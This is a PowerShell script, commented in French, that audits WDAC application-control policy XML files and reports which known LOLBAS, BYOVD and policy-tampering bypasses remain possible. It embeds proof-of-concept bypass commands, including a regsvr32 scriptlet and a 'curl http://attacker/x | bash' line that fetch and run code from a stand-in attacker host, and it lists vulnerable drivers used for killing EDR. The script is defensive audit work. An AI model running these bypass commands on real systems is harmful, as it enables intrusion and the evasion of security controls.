<#
.SYNOPSIS
    Invoke-WDACAudit - Auditeur WDAC / App Control for Business 

    Parse un ou plusieurs fichiers de politique WDAC (.xml issus de ConvertTo-WDACCodeIntegrityPolicy
    ou de CiPolicy Active), en extrait :
      * la liste de ce qui est AUTORISE (signers, hash, FilePath, FileName)
      * la liste de ce qui est INTERDIT (deny by hash / FileName, denied signers)
      * une DIFF technique par technique contre LOLBAS, LOLDrivers et bohops/UltimateWDACBypassList
        indiquant, pour chaque bypass connu, s'il est POSSIBLE ou BLOQUE et s'il faut ETRE ADMIN.

    A la fin : un RECAP GLOBAL pour l'audit, en separant clairement ce qui est jouable
    SANS admin et ce qui necessite l'admin.

.USAGE
    .\Invoke-WDACAudit.ps1 -Path .\{}.xml
    .\Invoke-WDACAudit.ps1 -Path . -Folder
    .\Invoke-WDACAudit.ps1 -Path . -Folder -Report .\WDAC-Audit.md
    .\Invoke-WDACAudit.ps1 -Path . -Folder -POC                # affiche les commandes POC
    .\Invoke-WDACAudit.ps1 -Path . -Folder -ShowAllowed        # dump complet allow/deny

.NOTES
    ASCII pur -> compatible Windows PowerShell 5.1 (pas de souci d'encodage).
    Sources references :
      LOLBAS      https://lolbas-project.github.io/
      LOLDrivers  https://www.loldrivers.io/
      bohops      https://github.com/bohops/UltimateWDACBypassList
      MS block    https://learn.microsoft.com/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
#>
param(
    [Parameter(Mandatory=$true)]
    [string]$Path,
    [switch]$Folder,
    [switch]$ShowAllowed,
    [switch]$POC,
    [string]$Report
)

$ErrorActionPreference = "Stop"
$bar  = "=" * 78
$dash = "-" * 78
$thin = "." * 78

# Buffer pour le rapport Markdown optionnel
$script:MD = New-Object System.Collections.Generic.List[string]
function W {
    param([string]$Text = "", [string]$Color = "Gray")
    Write-Host $Text -ForegroundColor $Color
    $script:MD.Add($Text)
}

# ============================================================================
#  BASES DE CONNAISSANCE
# ============================================================================

# --- LOLBAS : binaires signes Microsoft qui permettent d'executer du code ---
#     arbitraire (contournement du controle applicatif). "Kernel" = driver.
#     Le verdict reel est calcule dynamiquement selon la politique (deny FileName,
#     UMCI, Audit...). Ici : identite + POC + si l'usage exige l'admin.
$LOLBAS = @(
    @{ File="MSBuild.exe";                    Admin=$false; Tech="Compile+exec tache C# inline (Csc/inline task)";
       POC="msbuild.exe C:\temp\payload.proj  # <Target><CSharpClass/inline task>" }
    @{ File="Microsoft.Workflow.Compiler.exe"; Admin=$false; Tech="Execute assembly via XOML/workflow";
       POC="Microsoft.Workflow.Compiler.exe payload.xml out.txt" }
    @{ File="InstallUtil.exe";                Admin=$false; Tech="Execute code dans Uninstall() d'un assembly .NET";
       POC="InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.dll" }
    @{ File="RegSvcs.exe";                    Admin=$false; Tech="Charge assembly .NET (COM+)  [NON dans blocklist]";
       POC="RegSvcs.exe C:\temp\payload.dll" }
    @{ File="RegAsm.exe";                     Admin=$false; Tech="Charge assembly .NET  [NON dans blocklist]";
       POC="RegAsm.exe /U C:\temp\payload.dll" }
    @{ File="mshta.exe";                      Admin=$false; Tech="Execute HTA / JScript / VBScript";
       POC="mshta.exe C:\temp\payload.hta" }
    @{ File="wmic.exe";                       Admin=$false; Tech="XSL scriptlet via /format";
       POC="wmic.exe os get /format:'C:\temp\payload.xsl'" }
    @{ File="cscript.exe";                    Admin=$false; Tech="Execute VBScript/JScript";
       POC="cscript.exe //nologo C:\temp\payload.vbs" }
    @{ File="wscript.exe";                    Admin=$false; Tech="Execute VBScript/JScript";
       POC="wscript.exe C:\temp\payload.js" }
    @{ File="regsvr32.exe";                   Admin=$false; Tech="Squiblydoo : scrobj.dll scriptlet (COM)  [NON dans blocklist]";
       POC="regsvr32.exe /s /u /i:http://attacker/payload.sct scrobj.dll" }
    @{ File="rundll32.exe";                   Admin=$false; Tech="Charge DLL export / JS via mshtml  [NON dans blocklist]";
       POC="rundll32.exe C:\temp\payload.dll,EntryPoint" }
    @{ File="presentationhost.exe";           Admin=$false; Tech="Execute XBAP (.NET WPF browser app)  [NON dans blocklist]";
       POC="presentationhost.exe C:\temp\payload.xbap" }
    @{ File="cmstp.exe";                      Admin=$false; Tech="Execute INF/SCT (aussi bypass UAC)  [NON dans blocklist]";
       POC="cmstp.exe /au C:\temp\payload.inf" }
    @{ File="msxsl.exe";                      Admin=$false; Tech="XSLT scriptlet (outil MS a telecharger)  [NON dans blocklist]";
       POC="msxsl.exe input.xml payload.xsl" }
    @{ File="csi.exe";                        Admin=$false; Tech="C# interactive (Roslyn)";
       POC="csi.exe C:\temp\payload.csx" }
    @{ File="rcsi.exe";                       Admin=$false; Tech="C# interactive (Roslyn)";
       POC="rcsi.exe C:\temp\payload.csx" }
    @{ File="dnx.exe";                        Admin=$false; Tech="Execute projet .NET Core (DNX)";
       POC="dnx.exe C:\temp\proj run" }
    @{ File="dotnet.exe";                     Admin=$false; Tech="Build+run projet .NET";
       POC="dotnet.exe run --project C:\temp\proj" }
    @{ File="fsi.exe";                        Admin=$false; Tech="F# interactive";
       POC="fsi.exe C:\temp\payload.fsx" }
    @{ File="fsiAnyCpu.exe";                  Admin=$false; Tech="F# interactive";
       POC="fsiAnyCpu.exe C:\temp\payload.fsx" }
    @{ File="aspnet_compiler.exe";            Admin=$false; Tech="Compile+exec app ASP.NET";
       POC="aspnet_compiler.exe -v none -p C:\temp\site -f C:\temp\out" }
    @{ File="AddInProcess.exe";               Admin=$false; Tech="Charge add-in .NET (pipe)";
       POC="AddInProcess.exe /guid:... /pid:..." }
    @{ File="InfDefaultInstall.exe";          Admin=$false; Tech="Execute section [RunPreSetupCommands] d'un .inf";
       POC="InfDefaultInstall.exe C:\temp\payload.inf" }
    @{ File="bash.exe";                       Admin=$false; Tech="Execute code Linux (WSL) hors WDAC user-mode";
       POC='bash.exe -c "curl http://attacker/x | bash"' }
    @{ File="wsl.exe";                        Admin=$false; Tech="Execute code Linux (WSL) hors WDAC user-mode";
       POC='wsl.exe -e /bin/bash -c "..."' }
    @{ File="runscripthelper.exe";            Admin=$false; Tech="Execute PowerShell via telemetrie";
       POC="runscripthelper.exe surfacecheck ... C:\temp\payload.txt" }
    @{ File="TextTransform.exe";              Admin=$false; Tech="Execute template T4 (C#)";
       POC="TextTransform.exe -out out.txt C:\temp\payload.tt" }
    @{ File="windbg.exe";                     Admin=$false; Tech="Debugger : injection shellcode";
       POC="windbg.exe -c '...' target.exe" }
    @{ File="cdb.exe";                        Admin=$false; Tech="Debugger console : exec shellcode/cdb script";
       POC="cdb.exe -cf C:\temp\payload.wds -o notepad.exe" }
    @{ File="kd.exe";                         Admin=$false; Tech="Kernel debugger (mode user aussi)";
       POC="kd.exe -cf C:\temp\payload.wds ..." }
    @{ File="ntsd.exe";                       Admin=$false; Tech="Debugger NT : exec shellcode";
       POC="ntsd.exe -cf C:\temp\payload.wds ..." }
    @{ File="powershell.exe";                 Admin=$false; Tech="Si UMCI actif -> Constrained Language Mode; sinon FullLanguage";
       POC="powershell.exe -ep bypass -f C:\temp\payload.ps1" }
)

# --- LOLDrivers : BYOVD (kernel, EXIGE ADMIN pour charger un service driver) ---
$LOLDrivers = @(
    @{ File="RTCore64.sys";      CVE="CVE-2019-16098"; Desc="MSI Afterburner - R/W kernel arbitraire"; Impact="CRITICAL" }
    @{ File="DBUtil_2_3.sys";    CVE="CVE-2021-21551"; Desc="Dell DBUtil - R/W kernel arbitraire"; Impact="CRITICAL" }
    @{ File="dbutildrv2.sys";    CVE="CVE-2021-36276"; Desc="Dell BIOSUtil - R/W kernel"; Impact="CRITICAL" }
    @{ File="gdrv.sys";          CVE="CVE-2018-19320"; Desc="Gigabyte - R/W kernel + MSR"; Impact="CRITICAL" }
    @{ File="GLCKIo2.sys";       CVE="CVE-2020-14979"; Desc="ASUS AURA - R/W kernel"; Impact="CRITICAL" }
    @{ File="WinRing0x64.sys";   CVE="CVE-2020-14979"; Desc="OpenLibSys - R/W MSR/port IO"; Impact="CRITICAL" }
    @{ File=" ";                 CVE=""; Desc=""; Impact="" }  # placeholder retire plus bas
    @{ File="PROCEXP152.sys";    CVE="N/A";            Desc="Process Explorer - terminate protected process"; Impact="HIGH" }
    @{ File="kprocesshacker.sys";CVE="N/A";            Desc="Process Hacker - terminer/injecter process"; Impact="HIGH" }
    @{ File="dbk64.sys";         CVE="N/A";            Desc="Cheat Engine (DBK) - R/W kernel"; Impact="CRITICAL" }
    @{ File="dbk32.sys";         CVE="N/A";            Desc="Cheat Engine (DBK) - R/W kernel"; Impact="CRITICAL" }
    @{ File="PCHunter.sys";      CVE="N/A";            Desc="PCHunter - kill EDR / R-W kernel"; Impact="CRITICAL" }
    @{ File="mhyprot2.sys";      CVE="CVE-2020-36603"; Desc="Genshin anticheat - kill process/R-W"; Impact="CRITICAL" }
    @{ File="viragt64.sys";      CVE="CVE-2017-16238"; Desc="TG Soft - R/W kernel"; Impact="CRITICAL" }
    @{ File="ArbLtd.sys";        CVE="N/A";            Desc="EneTechIo - R/W physique"; Impact="CRITICAL" }
) | Where-Object { $_.File.Trim() -ne "" }

# --- bohops / UltimateWDACBypassList : techniques (au dela des simples LOLBINs) ---
#     Cond = fonction booleenne evaluee sur le modele de politique.
$Bohops = @(
    @{ Name="MSBuild inline task";            Admin=$false; Ref="bohops #1";
       Desc="msbuild.exe compile & execute une tache C# inline (pas de csc.exe requis)";
       Blk={ param($m) $m.DenyFileNames -contains "msbuild.exe" } }
    @{ Name="Signed app + DLL side-load";     Admin=$false; Ref="bohops DLL hijack";
       Desc="Placer une DLL non signee a cote d'un EXE signe autorise (si dossier writable)";
       Blk={ param($m) $m.HasUMCI -and $m.EnforcedForUser } }
    @{ Name="Assembly.Load reflection (.NET)";Admin=$false; Ref="bohops managed";
       Desc="[Reflection.Assembly]::Load(bytes) depuis PowerShell/JS -> exec en memoire";
       Blk={ param($m) $m.HasUMCI -and $m.EnforcedForUser -and (-not $m.HasNoUMCIscriptGap) } }
    @{ Name="mshta / JScript / VBScript";     Admin=$false; Ref="bohops scripting";
       Desc="Execution de scriptlets via mshta.exe";
       Blk={ param($m) $m.DenyFileNames -contains "mshta.exe" } }
    @{ Name="Regsvr32 Squiblydoo";            Admin=$false; Ref="bohops COM scriptlet";
       Desc="regsvr32 /i:url scrobj.dll -> execute un scriptlet COM distant";
       Blk={ param($m) $m.DenyFileNames -contains "regsvr32.exe" } }
    @{ Name="cmstp INF exec";                 Admin=$false; Ref="bohops INF";
       Desc="cmstp.exe execute des commandes via un .inf (aussi bypass UAC)";
       Blk={ param($m) $m.DenyFileNames -contains "cmstp.exe" } }
    @{ Name="LOLBIN signe non bloque";        Admin=$false; Ref="bohops signed";
       Desc="Utiliser un binaire signe MS absent de la blocklist (rappel: renommer NE bypasse PAS un deny FileName qui lit l'OriginalFileName du PE)";
       Blk={ param($m) $false } }
    @{ Name="Remplacer la politique (unsigned)";Admin=$true;  Ref="bohops policy tamper";
       Desc="Politique non signee -> admin remplace le .cip par un AllowAll (via CiTool)";
       Blk={ param($m) -not $m.HasUnsigned } }
    @{ Name="Supplemental AllowAll (No Reboot)";Admin=$true; Ref="bohops supplemental";
       Desc="Deployer une politique supplementaire malveillante, active sans reboot";
       Blk={ param($m) -not ($m.HasNoReboot -and $m.AllowSupplemental) } }
    @{ Name="BYOVD (driver vulnerable)";      Admin=$true;  Ref="LOLDrivers";
       Desc="Charger un driver signe vulnerable pour executer en kernel / tuer l'EDR";
       Blk={ param($m) $false } }  # evalue en detail dans la section drivers
    @{ Name="Managed Installer tagging";      Admin=$false; Ref="bohops ISG/MI";
       Desc="Faire installer le payload par un managed installer -> binaire taggue trusted";
       Blk={ param($m) -not $m.HasManagedInstaller } }
    @{ Name="ISG reputation";                 Admin=$false; Ref="bohops ISG";
       Desc="Binaire 'known good' auto-autorise par la reputation cloud (SmartScreen/ISG)";
       Blk={ param($m) -not $m.HasISG } }
    @{ Name="WSL / bash";                     Admin=$false; Ref="bohops WSL";
       Desc="Executer du code Linux hors du perimetre WDAC user-mode";
       Blk={ param($m) $m.DenyFileNames -contains "wsl.exe" -or $m.DenyFileNames -contains "bash.exe" } }
)

# ============================================================================
#  PARSING D'UNE POLITIQUE -> MODELE
# ============================================================================
function Get-WDACModel {
    param([xml]$xml, [string]$fileName)

    $p = $xml.SiPolicy
    $m = [ordered]@{}
    $m.File        = $fileName
    $m.PolicyType  = $p.PolicyType
    $m.PolicyID    = $p.PolicyID
    $m.BasePolicyID= $p.BasePolicyID
    $m.Version     = $p.VersionEx
    $m.IsSupplemental = ($p.PolicyType -eq "Supplemental Policy")

    # -- Nom lisible (Settings PolicyInfo/Name) --
    $m.Name = "(sans nom)"
    if ($p.Settings.Setting) {
        foreach ($s in $p.Settings.Setting) {
            if ($s.ValueName -eq "Name" -and $s.Value.String) { $m.Name = $s.Value.String }
        }
    }

    # -- Options --
    $opts = @()
    if ($p.Rules.Rule) { foreach ($r in $p.Rules.Rule) { if ($r.Option) { $opts += $r.Option } } }
    $m.Options = $opts
    function HasOpt($pat) { return (@($opts | Where-Object { $_ -match $pat }).Count -gt 0) }

    $m.IsAudit           = HasOpt "Audit Mode"
    $m.HasUMCI           = HasOpt "Enabled:UMCI"
    $m.HasUnsigned       = HasOpt "Unsigned System Integrity"
    $m.HasNoReboot       = HasOpt "Update Policy No Reboot"
    $m.AllowSupplemental = HasOpt "Allow Supplemental"
    $m.HasManagedInstaller = HasOpt "Managed Installer"
    $m.HasISG            = HasOpt "Intelligent Security Graph"
    $m.HasBootMenu       = HasOpt "Advanced Boot Options Menu"
    $m.InheritDefault    = HasOpt "Inherit Default Policy"
    # WDAC applique le controle des scripts (CLM) quand UMCI est actif et hors audit
    $m.HasNoUMCIscriptGap = (-not $m.HasUMCI)
    # Enforce reel sur le user-mode : UMCI actif ET pas en audit
    $m.EnforcedForUser   = ($m.HasUMCI -and -not $m.IsAudit)

    # -- Signers --
    $signers = @{}
    if ($p.Signers.Signer) {
        foreach ($s in $p.Signers.Signer) {
            $faRefs = @()
            if ($s.FileAttribRef) { foreach ($fr in $s.FileAttribRef) { $faRefs += $fr.RuleID } }
            $signers[$s.ID] = [ordered]@{
                ID=$s.ID; Name=$s.Name
                RootType=$s.CertRoot.Type; RootValue=$s.CertRoot.Value
                Publisher= $(if ($s.CertPublisher) { $s.CertPublisher.Value } else { $null })
                EKU=$(if ($s.CertEKU) { $s.CertEKU.ID } else { $null })
                FileAttribRefs=$faRefs
                Constrained=($faRefs.Count -gt 0)
            }
        }
    }
    $m.Signers = $signers

    # -- FileRules : Allow / Deny (hash, FileName, FilePath) --
    $allowHash=0; $denyHash=0
    $allowFileName=@(); $denyFileName=@(); $allowFilePath=@(); $denyFilePath=@()
    if ($p.FileRules) {
        foreach ($c in $p.FileRules.ChildNodes) {
            $isDeny = ($c.LocalName -eq "Deny")
            $isAllow= ($c.LocalName -eq "Allow" -or $c.LocalName -eq "FileRule")
            if (-not ($isDeny -or $isAllow)) { continue }
            if ($c.Hash)     { if ($isDeny) { $denyHash++ } else { $allowHash++ } }
            if ($c.FileName) { if ($isDeny) { $denyFileName += $c.FileName } else { $allowFileName += $c.FileName } }
            if ($c.FilePath) { if ($isDeny) { $denyFilePath += $c.FilePath } else { $allowFilePath += $c.FilePath } }
        }
    }
    $m.AllowHashCount = $allowHash
    $m.DenyHashCount  = $denyHash
    $m.AllowFileNames = @($allowFileName)
    # deny FileName -> minuscules pour comparaison robuste
    $m.DenyFileNames  = @($denyFileName | ForEach-Object { $_.ToLower() } | Select-Object -Unique)
    $m.AllowFilePaths = @($allowFilePath)
    $m.DenyFilePaths  = @($denyFilePath)

    # -- Scenarios : signers autorises / refuses (user-mode=12, kernel=131) --
    $allowedUser=@(); $allowedKernel=@(); $deniedAll=@()
    if ($p.SigningScenarios.SigningScenario) {
        foreach ($sc in $p.SigningScenarios.SigningScenario) {
            $isUser = ($sc.Value -eq "12")
            if ($sc.ProductSigners.AllowedSigners.AllowedSigner) {
                foreach ($a in $sc.ProductSigners.AllowedSigners.AllowedSigner) {
                    if ($isUser) { $allowedUser += $a.SignerId } else { $allowedKernel += $a.SignerId }
                }
            }
            if ($sc.ProductSigners.DeniedSigners.DeniedSigner) {
                foreach ($d in $sc.ProductSigners.DeniedSigners.DeniedSigner) { $deniedAll += $d.SignerId }
            }
        }
    }
    $m.AllowedUserSigners   = @($allowedUser   | Select-Object -Unique)
    $m.AllowedKernelSigners = @($allowedKernel | Select-Object -Unique)
    $m.DeniedSigners        = @($deniedAll     | Select-Object -Unique)

    # -- Signers "publisher-wide" (autorises sans contrainte de fichier) => LOLBin large --
    $wide=@()
    foreach ($sid in $m.AllowedUserSigners) {
        if ($signers.ContainsKey($sid) -and -not $signers[$sid].Constrained) { $wide += $sid }
    }
    $m.PublisherWideSigners = @($wide | Select-Object -Unique)

    return $m
}

# ============================================================================
#  EVALUATION : un LOLBIN est-il jouable sous cette politique ?
# ============================================================================
function Get-LOLBASVerdict {
    param($m, $entry)
    $fn = $entry.File.ToLower()
    $isKernel = $fn.EndsWith(".sys")
    # Politique supplementaire : elle n'ajoute que des allow, l'enforcement vient de la base
    if ($m.IsSupplemental) {
        return @{ Verdict="N/A"; Reason="Politique supplementaire (n'impose rien, ajoute des allow a la base)" }
    }
    if ($m.IsAudit) {
        return @{ Verdict="POSSIBLE"; Reason="AUDIT MODE : la politique n'empeche rien (log seulement)" }
    }
    if (-not $isKernel -and -not $m.HasUMCI) {
        return @{ Verdict="POSSIBLE"; Reason="UMCI absent : aucun controle user-mode (EXE/DLL/script)" }
    }
    if ($m.DenyFileNames -contains $fn) {
        return @{ Verdict="BLOQUE"; Reason="Deny by FileName present (Microsoft recommended block rules)" }
    }
    # Signe MS, non bloque => le binaire tourne (et donc le bypass qu'il porte)
    return @{ Verdict="POSSIBLE"; Reason="Binaire signe MS, non present dans la blocklist -> execute" }
}

# ============================================================================
#  ANALYSE + AFFICHAGE D'UNE POLITIQUE
# ============================================================================
$AllModels = @()

function Show-Policy {
    param($m)

    W ""
    W $bar "Cyan"
    W ("  POLITIQUE : {0}   [{1}]" -f $m.Name, $m.File) "Cyan"
    W $bar "Cyan"
    W ("  Type      : {0}" -f $m.PolicyType) "White"
    W ("  PolicyID  : {0}" -f $m.PolicyID) "DarkGray"
    W ("  BasePolicy: {0}" -f $m.BasePolicyID) "DarkGray"
    W ("  Version   : {0}" -f $m.Version) "DarkGray"

    # --- Etat d'enforcement ---
    W ""
    W "  [ETAT DE LA POLITIQUE]" "Yellow"
    $enfTxt = if ($m.IsSupplemental) { "SUPPLEMENTALE (ajoute des allow a la base)" }
              elseif ($m.IsAudit)    { "AUDIT ONLY -> NE BLOQUE RIEN (log 3076/3077)" }
              elseif (-not $m.HasUMCI){ "ENFORCED mais UMCI ABSENT -> user-mode NON controle" }
              else                    { "ENFORCED + UMCI -> user-mode controle" }
    $enfCol = if ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental)) { "Red" } else { "Green" }
    W ("    Enforcement : {0}" -f $enfTxt) $enfCol
    foreach ($o in $m.Options) {
        $c = if ($o -match "Audit|Unsigned|No Reboot") { "Red" } elseif ($o -match "UMCI") { "Green" } else { "DarkGray" }
        W ("      - {0}" -f $o) $c
    }

    # --- CE QUI EST AUTORISE ---
    W ""
    W "  [AUTORISE]" "Green"
    W ("    Allow by hash     : {0}" -f $m.AllowHashCount) "Gray"
    W ("    Allow by FileName : {0}" -f $m.AllowFileNames.Count) "Gray"
    W ("    Allow by FilePath : {0}" -f $m.AllowFilePaths.Count) "Gray"
    foreach ($fp in $m.AllowFilePaths) { W ("        PATH> {0}" -f $fp) "Cyan" }
    W ("    Signers user-mode : {0}   (dont publisher-wide: {1})" -f $m.AllowedUserSigners.Count, $m.PublisherWideSigners.Count) "Gray"
    W ("    Signers kernel    : {0}" -f $m.AllowedKernelSigners.Count) "Gray"

    # Detail des signers publisher-wide (les plus permissifs)
    if ($m.PublisherWideSigners.Count -gt 0) {
        W "    Signers SANS contrainte (tout binaire de l'editeur passe) :" "DarkYellow"
        foreach ($sid in ($m.PublisherWideSigners | Select-Object -First 40)) {
            $s = $m.Signers[$sid]
            $pub = if ($s.Publisher) { $s.Publisher } else { "root=$($s.RootType):$($s.RootValue)" }
            W ("        SIGNER> {0}  [{1}]" -f $pub, $sid) "DarkYellow"
        }
        if ($m.PublisherWideSigners.Count -gt 40) { W ("        ... (+{0})" -f ($m.PublisherWideSigners.Count-40)) "DarkGray" }
    }
    if ($ShowAllowed -and $m.AllowFileNames.Count -gt 0) {
        W "    Allow FileName (liste) :" "DarkGray"
        foreach ($n in ($m.AllowFileNames | Select-Object -Unique)) { W ("        + {0}" -f $n) "DarkGray" }
    }

    # --- CE QUI EST INTERDIT ---
    W ""
    W "  [INTERDIT]" "Red"
    W ("    Deny by hash      : {0}" -f $m.DenyHashCount) "Gray"
    W ("    Deny by FileName  : {0}  (LOLBIN blocklist)" -f $m.DenyFileNames.Count) "Gray"
    W ("    Denied signers    : {0}" -f $m.DeniedSigners.Count) "Gray"
    if ($ShowAllowed -and $m.DenyFileNames.Count -gt 0) {
        W "    Deny FileName (liste) :" "DarkGray"
        foreach ($n in $m.DenyFileNames) { W ("        - {0}" -f $n) "DarkGray" }
    }

    # --- DIFF LOLBAS ---
    W ""
    W "  [DIFF LOLBAS]  (https://lolbas-project.github.io/)" "Magenta"
    W ("    {0,-28} {1,-9} {2}" -f "Binaire", "Verdict", "Raison") "DarkGray"
    $lolPossibleNoAdmin=0; $lolBlocked=0
    foreach ($e in $LOLBAS) {
        $v = Get-LOLBASVerdict $m $e
        if ($v.Verdict -eq "N/A") { continue }
        $col = switch ($v.Verdict) { "POSSIBLE" { "Red" } "BLOQUE" { "Green" } default { "Gray" } }
        if ($v.Verdict -eq "POSSIBLE") { $lolPossibleNoAdmin++ } elseif ($v.Verdict -eq "BLOQUE") { $lolBlocked++ }
        W ("    {0,-28} {1,-9} {2}" -f $e.File, $v.Verdict, $v.Reason) $col
        if ($POC -and $v.Verdict -eq "POSSIBLE") {
            W ("        TECH> {0}" -f $e.Tech) "DarkGray"
            W ("        POC > {0}" -f $e.POC) "Yellow"
        }
    }
    W ("    => POSSIBLE(sans admin): {0}   BLOQUE: {1}" -f $lolPossibleNoAdmin, $lolBlocked) "White"

    # --- DIFF bohops / UltimateWDACBypassList ---
    W ""
    W "  [DIFF bohops UltimateWDACBypassList]  (https://github.com/bohops/UltimateWDACBypassList)" "Magenta"
    foreach ($b in $Bohops) {
        if ($m.IsSupplemental -and $b.Name -notmatch "Supplemental|policy") { continue }
        $blocked = & $b.Blk $m
        # En audit / pas UMCI, tout ce qui est user-mode passe
        $userTech = ($b.Admin -eq $false)
        if ($userTech -and ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental))) { $blocked = $false }
        $verdict = if ($blocked) { "BLOQUE" } else { "POSSIBLE" }
        $col = if ($blocked) { "Green" } else { "Red" }
        $adminTag = if ($b.Admin) { "[ADMIN]" } else { "[user] " }
        W ("    {0} {1,-9} {2,-32} {3}" -f $adminTag, $verdict, $b.Name, $b.Ref) $col
        W ("             {0}" -f $b.Desc) "DarkGray"
    }

    # --- DIFF LOLDrivers (BYOVD) ---
    W ""
    W "  [DIFF LOLDrivers - BYOVD]  (https://www.loldrivers.io/)" "Magenta"
    if ($m.IsSupplemental) {
        W "    (supplementale : l'enforcement kernel vient de la base)" "DarkGray"
    } else {
        $driverBlockable = ($m.HasUMCI -and -not $m.IsAudit)
        foreach ($d in $LOLDrivers) {
            $fn = $d.File.ToLower()
            $isBlocked = $driverBlockable -and ($m.DenyFileNames -contains $fn)
            $verdict = if ($m.IsAudit) { "POSSIBLE" }
                       elseif ($isBlocked) { "BLOQUE" }
                       else { "POSSIBLE" }
            $col = if ($verdict -eq "BLOQUE") { "Green" } else { "Red" }
            W ("    [ADMIN] {0,-9} {1,-22} {2}  ({3})" -f $verdict, $d.File, $d.Desc, $d.CVE) $col
        }
        W "    Note: charger un driver EXIGE l'admin. WDAC bloque les .sys non signes;" "DarkGray"
        W "          le BYOVD reste possible avec un driver signe non present en deny." "DarkGray"
    }

    # --- Verdict synthetique de la politique ---
    $m.SummaryNoAdmin = @()
    $m.SummaryAdmin   = @()
    if (-not $m.IsSupplemental) {
        if ($m.IsAudit) {
            $m.SummaryNoAdmin += "Politique en AUDIT : execution libre de tout code (rien n'est bloque)."
        } elseif (-not $m.HasUMCI) {
            $m.SummaryNoAdmin += "UMCI absent : tous les LOLBINs user-mode + scripts s'executent."
        } else {
            $notBlocked = @($LOLBAS | Where-Object { -not ($m.DenyFileNames -contains $_.File.ToLower()) -and -not $_.File.ToLower().EndsWith('.sys') })
            if ($notBlocked.Count -gt 0) {
                $m.SummaryNoAdmin += ("LOLBINs signes MS non bloques: " + (($notBlocked | ForEach-Object { $_.File }) -join ", "))
            }
            if ($m.AllowFilePaths.Count -gt 0) {
                $m.SummaryNoAdmin += ("FilePath allow (bypass si dossier writable): " + ($m.AllowFilePaths -join "; "))
            }
            if ($m.HasManagedInstaller) { $m.SummaryNoAdmin += "Managed Installer actif : tag de confiance exploitable." }
            if ($m.HasISG) { $m.SummaryNoAdmin += "ISG actif : binaires 'known good' auto-autorises." }
        }
        if ($m.HasUnsigned) { $m.SummaryAdmin += "Politique NON signee : admin remplace/supprime le .cip (CiTool)." }
        if ($m.HasNoReboot -and $m.AllowSupplemental) { $m.SummaryAdmin += "Supplementale AllowAll active sans reboot." }
        elseif ($m.HasNoReboot) { $m.SummaryAdmin += "Update Policy No Reboot : changement de politique immediat." }
        $m.SummaryAdmin += "BYOVD : charger un driver signe vulnerable (LOLDrivers) pour kernel/EDR kill."
    } else {
        $m.SummaryNoAdmin += ("Ajoute des autorisations a la base " + $m.BasePolicyID + " (elargit la surface).")
        if ($m.AllowFilePaths.Count -gt 0) {
            $m.SummaryNoAdmin += ("Autorise par chemin: " + ($m.AllowFilePaths -join "; ") + " -> hijack si writable.")
        }
    }
}

# ============================================================================
#  RESOLUTION DES FICHIERS
# ============================================================================
$xmlFiles = @()
if ($Folder -or ((Test-Path $Path) -and (Get-Item $Path).PSIsContainer)) {
    $xmlFiles = @(Get-ChildItem -Path $Path -Filter "*.xml" -Recurse | Sort-Object Name)
} else {
    $xmlFiles = @(Get-Item $Path)
}
if ($xmlFiles.Count -eq 0) { Write-Error "Aucun .xml trouve dans $Path"; exit 1 }

W ""
W $bar "Cyan"
W ("  WDAC AUDIT - {0} FICHIER(S)  -  {1}" -f $xmlFiles.Count, (Get-Date -Format "yyyy-MM-dd HH:mm")) "Cyan"
W $bar "Cyan"

foreach ($f in $xmlFiles) {
    try {
        [xml]$xml = Get-Content $f.FullName -Raw
        if (-not $xml.SiPolicy) { W ("  [SKIP] {0} : pas une politique SiPolicy" -f $f.Name) "DarkGray"; continue }
        $m = Get-WDACModel $xml $f.Name
        Show-Policy $m
        $AllModels += $m
    } catch {
        W ("  [ERREUR] {0} : {1}" -f $f.Name, $_.Exception.Message) "Red"
    }
}

# ============================================================================
#  RECAP GLOBAL POUR L'AUDIT
# ============================================================================
W ""
W $bar "Cyan"
W "  RECAP GLOBAL POUR L'AUDIT" "Cyan"
W $bar "Cyan"

# Vue d'ensemble des politiques
W ""
W "  Politiques analysees :" "Yellow"
foreach ($m in $AllModels) {
    $state = if ($m.IsSupplemental) { "SUPPL." } elseif ($m.IsAudit) { "AUDIT " } elseif (-not $m.HasUMCI) { "NO-UMCI" } else { "ENFORCE" }
    $col = if ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental)) { "Red" } else { "Green" }
    W ("    [{0}] {1,-14} {2}  (base={3})" -f $state, $m.Name, $m.File, $m.BasePolicyID) $col
}

# Determination de la politique de base effectivement ENFORCEE
$enforcedBases = @($AllModels | Where-Object { -not $_.IsSupplemental -and -not $_.IsAudit })
$auditBases    = @($AllModels | Where-Object { -not $_.IsSupplemental -and $_.IsAudit })
$supplementals = @($AllModels | Where-Object { $_.IsSupplemental })

W ""
W "  Analyse d'enforcement effective :" "Yellow"
W ("    Bases ENFORCEES : {0}" -f $enforcedBases.Count) "White"
foreach ($b in $enforcedBases) { W ("      -> {0} ({1})" -f $b.Name, $b.File) "Green" }
W ("    Bases en AUDIT  : {0}  (ne bloquent rien)" -f $auditBases.Count) "White"
foreach ($b in $auditBases) { W ("      -> {0} ({1}) : execution libre" -f $b.Name, $b.File) "Red" }
W ("    Supplementales  : {0}  (elargissent les allow)" -f $supplementals.Count) "White"
foreach ($s in $supplementals) { W ("      -> {0} ({1})" -f $s.Name, $s.File) "Cyan" }

# ---- SANS ADMIN ----
W ""
W $dash "DarkGray"
W "  >>> EXECUTABLE SANS ADMIN <<<" "Green"
W $dash "DarkGray"
$anyNoAdmin = $false
foreach ($m in $AllModels) {
    if ($m.SummaryNoAdmin.Count -eq 0) { continue }
    $anyNoAdmin = $true
    W ("  [{0} / {1}]" -f $m.Name, $m.File) "White"
    foreach ($line in $m.SummaryNoAdmin) { W ("     * {0}" -f $line) "Green" }
}
if (-not $anyNoAdmin) { W "  (rien d'evident sans admin)" "DarkGray" }

# ---- AVEC ADMIN ----
W ""
W $dash "DarkGray"
W "  >>> NECESSITE ADMIN <<<" "Red"
W $dash "DarkGray"
$anyAdmin = $false
foreach ($m in $AllModels) {
    if ($m.SummaryAdmin.Count -eq 0) { continue }
    $anyAdmin = $true
    W ("  [{0} / {1}]" -f $m.Name, $m.File) "White"
    foreach ($line in $m.SummaryAdmin) { W ("     * {0}" -f $line) "Red" }
}
if (-not $anyAdmin) { W "  (rien d'evident cote admin)" "DarkGray" }

# ---- Verdict global lab ----
W ""
W $dash "DarkGray"
